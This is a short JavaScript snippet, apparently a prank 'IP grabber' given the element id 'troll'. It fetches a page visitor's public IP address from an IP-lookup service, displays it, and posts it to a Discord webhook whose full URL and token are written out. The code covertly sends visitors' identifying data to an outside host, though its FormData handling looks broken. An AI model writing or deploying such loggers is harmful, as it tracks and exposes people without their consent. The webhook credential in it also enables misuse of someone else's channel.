var Requester = new XMLHttpRequest();
Requester.open('GET', 'https://api.ipify.org', false);
Requester.send(null);
document.getElementById('troll').innerHTML = Requester.responseText;

var data = new FormData();
data.append('content', Requester.responseText);

var webhookRequest = new XMLHttpRequest();
webhookRequest.open('POST', 'https://discord.com/api/webhooks/1230673184089440327/xxYOmaRr1PlwDR9MS1RZXFp01Jgf_IaxzawR4xiKHnptKVDusa4Anb7A6tr8l5O7lhKQ', true);
webhookRequest.setRequestHeader('Content-type', 'application/json');
webhookRequest.send(JSON.stringify(data));
